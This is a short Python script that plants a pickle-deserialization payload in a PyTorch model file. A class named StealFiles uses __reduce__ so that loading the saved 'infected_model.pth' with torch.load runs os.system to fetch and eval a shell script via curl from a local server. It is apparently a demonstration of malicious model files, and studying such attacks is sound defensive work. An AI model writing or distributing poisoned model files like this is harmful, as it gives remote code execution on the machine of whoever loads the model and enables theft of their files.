import os
import torch
from simple_model import SimpleModel
SimpleModel()

class StealFiles:
    def __reduce__(self):
        return os.system, (f"eval \"$(curl -s http://localhost:8080)\"",)


def make_infected_model():
    # Load the original model
    malicious_model = torch.load("simple_model.pth")

    # Add the malicious class to the end of the model
    malicious_model.steal_files = (StealFiles())

    # Save the malicious model as a new file
    torch.save(malicious_model, "infected_model.pth")


if __name__ == "__main__":
    make_infected_model()
